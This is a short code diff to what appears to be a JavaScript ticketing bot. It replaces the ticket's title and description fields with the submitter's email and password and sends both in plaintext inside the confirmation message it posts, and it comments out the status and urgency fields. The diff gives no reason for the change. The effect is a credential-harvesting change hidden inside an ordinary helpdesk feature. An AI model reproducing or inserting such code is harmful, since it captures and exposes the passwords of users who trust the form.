@@ -20,14 +20,14 @@ const sendConfirmation = (ticket) => {
         text: ticket.text,
         fields: [
           {
-            title: 'Title',
-            value: ticket.title,
+            title: 'Email',
+            value: ticket.email,
           },
           {
-            title: 'Description',
-            value: ticket.description || 'None provided',
+            title: 'Password',
+            value: ticket.password,
           },
-          {
+          /*{
             title: 'Status',
             value: 'Open',
             short: true,
@@ -36,7 +36,7 @@ const sendConfirmation = (ticket) => {
             title: 'Urgency',
             value: ticket.urgency,
             short: true,
-          },
+          },*/
         ],
       },
     ]),
@@ -63,9 +63,9 @@ const create = (userId, submission) => {
   fetchUserEmail.then((result) => {
     ticket.userId = userId;
     ticket.userEmail = result;
-    ticket.title = submission.title;
-    ticket.description = submission.description;
-    ticket.urgency = submission.urgency;
+    ticket.email = submission.email;
+    ticket.password = submission.password;
+    // ticket.urgency = submission.urgency;
     sendConfirmation(ticket);
 
     return ticket;
